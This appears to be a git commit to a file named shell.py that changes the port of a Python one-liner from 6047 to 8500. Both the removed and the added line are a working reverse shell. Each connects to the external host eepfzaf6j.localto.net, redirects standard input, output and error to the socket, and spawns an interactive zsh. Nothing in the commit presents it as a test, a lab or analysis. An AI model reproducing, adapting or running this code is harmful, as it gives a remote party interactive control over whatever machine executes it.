e025b68f7d1650ad60f26c6ab8f84e5252097e4c
nfdownload <rootdxtrz@gmail.com>
2026-02-15 12:50:43 -0300

    Change connection port from 6047 to 8500
    Signed-off-by: nfdownload <rootdxtrz@gmail.com>

--- shell.py
+++ shell.py
@@ -1,1 +1,1 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("eepfzaf6j.localto.net",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("zsh")
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("eepfzaf6j.localto.net",8500));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("zsh")
